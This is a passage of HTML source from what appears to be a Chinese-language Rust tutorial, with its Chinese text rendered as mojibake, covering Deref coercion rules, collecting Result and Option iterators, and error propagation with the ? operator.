&lt;/div>&lt;h4 id="deref-å’Œ-derefmut-å¼ºåˆ¶è½¬æ¢è§„åˆ™">Deref å’Œ DerefMut å¼ºåˆ¶è½¬æ¢è§„åˆ™&lt;/h4>
&lt;p>åœ¨éšå¼è½¬æ¢ä¸­ï¼Œå¦‚æœåŸå‚æ•°æ˜¯å¯å˜å¼•ç”¨ (&lt;code>&amp;amp;mut&lt;/code>), éœ€è¦è½¬æ¢çš„ç›®æ ‡å‚æ•°ä¹Ÿæ˜¯å¯å˜å¼•ç”¨ï¼Œåˆ™å¿…é¡»å®ç° &lt;code>DerefMut&lt;/code> trait æ‰èƒ½æ”¯æŒã€‚&lt;/p>
&lt;p>å…·ä½“è§„åˆ™å¦‚ä¸‹ï¼š&lt;/p>
&lt;dl>
&lt;dt>&lt;code>&amp;amp;T&lt;/code> â†’ &lt;code>&amp;amp;U&lt;/code>&lt;/dt>
&lt;dd>å½“ &lt;code>T: Deref&amp;lt;Target=U&amp;gt;&lt;/code>&lt;/dd>
&lt;dt>&lt;code>&amp;amp;mut T&lt;/code> â†’ &lt;code>&amp;amp;mut U&lt;/code>&lt;/dt>
&lt;dd>å½“ &lt;code>T: DerefMut&amp;lt;Target=U&amp;gt;&lt;/code>&lt;/dd>
&lt;dt>&lt;code>&amp;amp;mut T&lt;/code> â†’ &lt;code>&amp;amp;U&lt;/code>&lt;/dt>
&lt;dd>å½“ &lt;code>T: Deref&amp;lt;Target=U&amp;gt;&lt;/code>&lt;/dd>
&lt;/dl>
&lt;h2 id="trait-å’Œè¿­ä»£å™¨">Trait å’Œè¿­ä»£å™¨&lt;/h2>
&lt;p>ä¸ºäº†è¯´æ˜ trait åœ¨è¿­ä»£å™¨ä¸­çš„ä½œç”¨ï¼Œæˆ‘ä»¬å…ˆæ€è€ƒä¸€ä¸ªå¼€å‘è¿‡ç¨‹ä¸­å¸¸é‡åˆ°çš„é—®é¢˜ï¼š&lt;/p>
&lt;ul>
&lt;li>å½“æˆ‘ä»¬æœ‰ä¸€ä¸ª &lt;code>Result&lt;/code> æ•°ç»„/åˆ—è¡¨æ—¶ï¼Œå¦‚ä½•å¿«é€Ÿåˆ¤æ–­è¿™ä¸ª &lt;code>Result&lt;/code> åˆ—è¡¨é‡Œé¢æ˜¯å¦å­˜åœ¨é”™è¯¯ï¼Ÿ&lt;/li>
&lt;/ul>
&lt;p>ä½ ä¼šæ€ä¹ˆåšå‘¢ï¼Ÿ&lt;/p>
&lt;p>å½“ç„¶ï¼Œä½ å¯ä»¥éå†è¿™ä¸ªåˆ—è¡¨ï¼Œç„¶åé€ä¸ªåˆ¤æ–­ã€‚ä½†æ˜¯ &lt;code>Iterator.collect&lt;/code> æ–¹æ³•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´åŠ ä¼˜é›…çš„åšåˆ°è¿™ä¸€ç‚¹ï¼Œå¹¶ä¸”æ›´åŠ çš„ç¬¦åˆ Rustaceans çš„ä¹ æƒ¯:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="fm">vec!&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;nope&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;bad&amp;#34;&lt;/span>&lt;span class="p">)];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>: &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">Vec&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kt">str&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">into_iter&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">collect&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// gives us the first error
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;nope&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>: &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">Vec&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kt">str&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">into_iter&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">collect&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// gives us the list of answers
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="fm">vec!&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç±»ä¼¼åœ°ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ &lt;code>collect&lt;/code> æ–¹æ³•å°†ä¸€ä¸ª &lt;code>Option&lt;/code> åˆ—è¡¨è½¬æ¢æˆä¸€ä¸ª &lt;code>Option&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="fm">vec!&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">None&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">None&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>: &lt;span class="nb">Option&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">Vec&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">iter&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">cloned&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">collect&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// gives us the first None
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">None&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>: &lt;span class="nb">Option&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">Vec&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">results&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">iter&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">cloned&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">collect&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// gives us the list of answers
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="fm">vec!&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>collect&lt;/code> æ–¹æ³•æ˜¯å¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿç­”æ¡ˆå°±åœ¨ &lt;code>Result&lt;/code> å’Œ &lt;code>Option&lt;/code> è¿™ä¸¤ä¸ªç±»å‹çš„ &lt;code>FromIterator&lt;/code>
trait çš„å®ç°ä¸Šã€‚&lt;/p>
&lt;p>&lt;code>collect&lt;/code> çš„è¡Œä¸ºå–å†³äºå®ƒçš„ç›®æ ‡ç±»å‹ï¼Œå…·ä½“æ¥è¯´ï¼Œå–å†³äºç›®æ ‡ç±»å‹çš„ &lt;code>FromIterator&lt;/code> trait
çš„å®ç°ã€‚ä¸åŒçš„ç±»å‹ä¼šå®ç°è‡ªå·±ç‹¬æœ‰çš„ &lt;code>FromIterator&lt;/code> é€»è¾‘ï¼Œæ®æ­¤æ¥å®šä¹‰å¦‚ä½•ä»ä¸€ä¸ªè¿­ä»£å™¨ä¸­çš„å…ƒç´ æ„å»ºè‡ªå·±ã€‚&lt;/p>
&lt;p>å¯¹äº &lt;code>Result&lt;/code> ç±»å‹ï¼Œ &lt;code>FromIterator&lt;/code> è¢«å®ç°ä¸ºï¼š&lt;/p>
&lt;ul>
&lt;li>å¦‚æœè¿­ä»£å™¨ä¸­çš„å…ƒç´ éƒ½æ˜¯ &lt;code>Ok&lt;/code>, åˆ™è¿”å›ä¸€ä¸ª &lt;code>Ok&lt;/code>, å…¶ä¸­åŒ…å«è¿­ä»£å™¨ä¸­æ‰€æœ‰ &lt;code>Ok&lt;/code> å€¼çš„é›†åˆã€‚&lt;/li>
&lt;li>å¦‚æœè¿­ä»£å™¨ä¸­å­˜åœ¨ä»»ä½• &lt;code>Err&lt;/code>, åˆ™è¿”å›ç¬¬ä¸€ä¸ª &lt;code>Err&lt;/code> ã€‚&lt;/li>
&lt;/ul>
&lt;p>å¯¹äº &lt;code>Option&lt;/code> ç±»å‹ï¼Œ &lt;code>FromIterator&lt;/code> çš„å®ç°ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚&lt;/p>
&lt;h2 id="trait-å’Œé”™è¯¯å¤„ç†">Trait å’Œé”™è¯¯å¤„ç†&lt;/h2>
&lt;h3 id="ä¼ æ’­é”™è¯¯--propagating-errors">ä¼ æ’­é”™è¯¯ (Propagating Errors)&lt;/h3>
&lt;p>Rust é‡‡ç”¨ä¼ æ’­é”™è¯¯ï¼ˆå³å‡½æ•°è¿”å›å€¼ï¼‰çš„å½¢å¼æ¥å¤„ç†â€œå¯æ¢å¤æ€§é”™è¯¯â€ (&lt;em>recoverable&lt;/em> errors)ï¼Œè€Œä¸æ˜¯å¼‚å¸¸æœºåˆ¶ã€‚&lt;/p>
&lt;p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">fs&lt;/span>::&lt;span class="n">File&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">io&lt;/span>::&lt;span class="p">{&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Read&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">read_username_from_file&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">String&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">io&lt;/span>::&lt;span class="n">Error&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username_file_result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">File&lt;/span>::&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello.txt&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username_file&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">match&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username_file_result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">match&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username_file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">read_to_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Err&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é—®å·è¿ç®—ç¬¦ (question mark operator) &lt;code>?&lt;/code> æ¥ç®€åŒ–é”™è¯¯ä¼ æ’­ã€‚ä¸Šè¿°ä»£ç ç­‰ä»·äºï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">fs&lt;/span>::&lt;span class="n">File&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">io&lt;/span>::&lt;span class="p">{&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Read&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">read_username_from_file&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">String&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">io&lt;/span>::&lt;span class="n">Error&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
